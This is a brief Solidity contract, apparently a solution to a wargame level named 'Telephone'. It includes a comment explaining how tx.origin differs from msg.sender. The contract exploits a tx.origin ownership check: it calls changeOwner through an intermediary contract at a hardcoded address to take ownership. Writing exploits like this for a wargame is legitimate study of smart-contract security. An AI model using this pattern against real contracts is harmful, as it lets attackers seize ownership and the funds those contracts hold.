// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

/** 
 * tx.origin and msg.sender are different in a call chain. If user A calls contract B which 
 * calls contract C, within the method call to C, msg.sender is B while tx.origin is A.
 */
contract Level4 is Ownable {
  Telephone t = Telephone(0xdDE0490B87242C958717C0E39559afE2d2F42011);

  function attack() public onlyOwner {
    t.changeOwner(msg.sender);
  }
}

abstract contract Telephone {
  function changeOwner(address _owner) virtual public;
}
